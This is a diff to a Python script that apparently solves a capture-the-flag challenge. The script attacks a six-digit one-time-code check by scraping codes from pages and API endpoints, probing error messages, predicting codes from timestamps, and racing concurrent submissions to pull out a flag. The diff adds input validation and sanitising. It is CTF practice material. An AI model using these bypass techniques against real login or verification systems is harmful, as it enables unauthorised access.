@@ -22,7 +22,6 @@ Strategy:
 import requests
 import time
 import re
-import threading
 import hashlib
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
@@ -30,27 +29,42 @@ BASE_URL = "http://kicyber-00c797b2c34e-trollclock-0-0.chals.io"
 
 session = requests.Session()
 
+_CODE_RE = re.compile(r'^\d{6}$')
+
+
+def _sanitize(text):
+    """Strip control characters from user-facing output derived from HTTP responses."""
+    return text.replace('\n', ' ').replace('\r', '').replace('\x00', '')
+
+
+def _validate_code(candidate):
+    """Return candidate only if it is exactly 6 ASCII digits, else None."""
+    if candidate and _CODE_RE.match(candidate):
+        return candidate
+    return None
+
+
 def get_page_and_extract_code():
     """Load the main page and try to extract OTP from HTML/JS"""
     resp = session.get(BASE_URL, timeout=10)
     print(f"[*] Page status: {resp.status_code}")
 
-    # Look for a code in the HTML (common CTF pattern)
-    # e.g., data-code="123456" or var code = "123456"
     patterns = [
         r'data-code["\s]*[:=]["\s]*["\']?(\d{6})',
         r'var\s+code\s*=\s*["\'](\d{6})',
         r'"code"\s*:\s*"?(\d{6})',
         r'otp["\s]*[:=]["\s]*["\']?(\d{6})',
         r'token["\s]*[:=]["\s]*["\']?(\d{6})',
-        r'>(\d{6})<',  # code displayed in element
+        r'>(\d{6})<',
     ]
 
     for p in patterns:
         m = re.search(p, resp.text, re.IGNORECASE)
         if m:
-            print(f"[+] Found code in HTML: {m.group(1)}")
-            return m.group(1), resp.cookies
+            code = _validate_code(m.group(1))
+            if code:
+                print(f"[+] Found code in HTML: {_sanitize(code)}")
+                return code, resp.cookies
 
     print("[*] Code not found in HTML.")
     return None, resp.cookies
@@ -75,20 +89,22 @@ def try_api_endpoints():
             r = session.get(BASE_URL + ep, timeout=5)
             if r.status_code == 200:
                 print(f"[+] API endpoint found: {ep}")
-                safe_preview = r.text[:200].replace('\n', ' ').replace('\r', '')
+                safe_preview = _sanitize(r.text[:200])
                 print(f"    Response: {safe_preview}")
 
-                # Try to extract 6-digit code from response
                 m = re.search(r'\b(\d{6})\b', r.text)
                 if m:
-                    return m.group(1), ep
+                    code = _validate_code(m.group(1))
+                    if code:
+                        return code, ep
 
-                # Try JSON
                 try:
                     data = r.json()
                     for key in ['code', 'otp', 'token', 'value']:
                         if key in data:
-                            return str(data[key]), ep
+                            code = _validate_code(str(data[key]))
+                            if code:
+                                return code, ep
                 except (ValueError, KeyError):
                     pass
         except (requests.RequestException, OSError):
@@ -97,34 +113,34 @@ def try_api_endpoints():
     return None, None
 
 
-def verify_code(code, extra_info=None):
+def verify_code(code):
     """Submit the code to verify endpoint"""
-    # Common submit endpoints
+    safe_code = _validate_code(code)
+    if not safe_code:
+        return None
+
     endpoints = ["/verify", "/submit", "/check", "/validate", "/api/verify"]
 
     for ep in endpoints:
         try:
-            # Try POST with form data
             r = session.post(BASE_URL + ep,
-                           data={"code": code},
-                           timeout=10,
-                           allow_redirects=False)
+                             data={"code": safe_code},
+                             timeout=10,
+                             allow_redirects=False)
 
             if r.status_code in [200, 302]:
                 text = r.text.lower()
                 if any(kw in text for kw in ['flag', 'kpmg_ctf', 'correct', 'success', 'congratulation']):
                     print("[!!!] FLAG FOUND via POST to endpoint!")
-                    # Extract flag
                     flag_match = re.search(r'KPMG_CTF\{[^}]+\}', r.text, re.IGNORECASE)
                     if flag_match:
                         return flag_match.group(0)
                     return "[flag found - check response]"
 
-            # Try POST with JSON
             r = session.post(BASE_URL + ep,
-                           json={"code": code},
-                           timeout=10,
-                           allow_redirects=False)
+                             json={"code": safe_code},
+                             timeout=10,
+                             allow_redirects=False)
 
             if r.status_code in [200, 302]:
                 text = r.text.lower()
@@ -149,11 +165,11 @@ def predict_code_from_timestamp():
     t = int(time.time())
 
     candidates = [
-        t % 1000000,                          # unix timestamp mod 1M
-        (t // 10) % 1000000,                  # changes every 10s
+        t % 1000000,
+        (t // 10) % 1000000,
         int(hashlib.sha256(str(t // 10).encode()).hexdigest()[:6], 16) % 1000000,
         int(hashlib.sha256(str(t // 37).encode()).hexdigest()[:6], 16) % 1000000,
-        (t // 37) % 1000000,                  # changes every 37s (challenge window)
+        (t // 37) % 1000000,
     ]
 
     return [f"{c:06d}" for c in candidates]
@@ -163,27 +179,20 @@ def race_condition_attack():
     """
     Race condition: send many requests concurrently to hit the code
     during the transition window between old and new codes.
-
-    This works if the server has a brief window where both old and new
-    codes are accepted (clock skew tolerance).
     """
     print("[*] Attempting race condition attack...")
 
-    # Get the current code from the page first
-    code, cookies = get_page_and_extract_code()
+    code, _ = get_page_and_extract_code()
     if not code:
         print("[!] Could not extract code from page")
         return None
 
-    print(f"[*] Current code: {code}")
-
-    results = []
+    safe_display = _sanitize(code)
+    print(f"[*] Current code: {safe_display}")
 
     def attempt(c):
         return verify_code(c)
 
-    # Try current code and adjacent codes (in case of TOTP-style tolerance)
-    # with parallel requests to maximize chances during transition
     with ThreadPoolExecutor(max_workers=20) as executor:
         futures = [executor.submit(attempt, code) for _ in range(20)]
         for f in as_completed(futures):
@@ -198,16 +207,14 @@ def timing_attack_on_error_messages():
     """
     The hint 'You start with errors and you learn to live with it'
     suggests examining error responses carefully.
-
-    Some servers leak timing information or code hints in error messages.
     """
     print("[*] Probing error messages for hints...")
 
     test_cases = [
-        "",           # empty
-        "000000",     # all zeros
-        "abc123",     # invalid format
-        None,         # missing parameter
+        "",
+        "000000",
+        "abc123",
+        None,
     ]
 
     for tc in test_cases:
@@ -217,14 +224,15 @@ def timing_attack_on_error_messages():
             else:
                 r = session.post(BASE_URL + "/verify", data={"code": tc}, timeout=5)
 
-            safe_body = r.text[:200].replace('\n', ' ').replace('\r', '')
+            safe_body = _sanitize(r.text[:200])
             print(f"  Input={repr(tc)}: status={r.status_code}, body={safe_body}")
 
-            # Look for any code hints in error response
             m = re.search(r'\b(\d{6})\b', r.text)
             if m:
-                print(f"[!!!] Potential code in error response: {m.group(1)}")
-                return m.group(1)
+                code = _validate_code(m.group(1))
+                if code:
+                    print(f"[!!!] Potential code in error response: {_sanitize(code)}")
+                    return code
         except requests.RequestException as e:
             print(f"  Error: {e}")
 
@@ -237,48 +245,43 @@ def main():
     print(f"Target: {BASE_URL}")
     print("=" * 60)
 
-    # Step 1: Probe for error message hints
     code_from_error = timing_attack_on_error_messages()
     if code_from_error:
         result = verify_code(code_from_error)
         if result:
-            print(f"\n[FLAG] {result}")
+            print(f"\n[FLAG] {_sanitize(result)}")
             return
 
-    # Step 2: Try API endpoints
     print("\n[*] Checking API endpoints...")
     api_code, ep = try_api_endpoints()
     if api_code:
-        print(f"[+] Got code {api_code} from {ep}")
+        print(f"[+] Got code {_sanitize(api_code)} from {ep}")
         result = verify_code(api_code)
         if result:
-            print(f"\n[FLAG] {result}")
+            print(f"\n[FLAG] {_sanitize(result)}")
             return
 
-    # Step 3: Extract from page source
     print("\n[*] Extracting code from page...")
-    page_code, cookies = get_page_and_extract_code()
+    page_code, _ = get_page_and_extract_code()
     if page_code:
         result = verify_code(page_code)
         if result:
-            print(f"\n[FLAG] {result}")
+            print(f"\n[FLAG] {_sanitize(result)}")
             return
 
-    # Step 4: Try timestamp-based prediction
     print("\n[*] Trying timestamp-based code prediction...")
     candidates = predict_code_from_timestamp()
     for c in candidates:
         print(f"[*] Trying predicted code: {c}")
         result = verify_code(c)
         if result:
-            print(f"\n[FLAG] {result}")
+            print(f"\n[FLAG] {_sanitize(result)}")
             return
 
-    # Step 5: Race condition attack
     print("\n[*] Trying race condition attack...")
     result = race_condition_attack()
     if result:
-        print(f"\n[FLAG] {result}")
+        print(f"\n[FLAG] {_sanitize(result)}")
         return
 
     print("\n[!] Could not solve challenge automatically.")
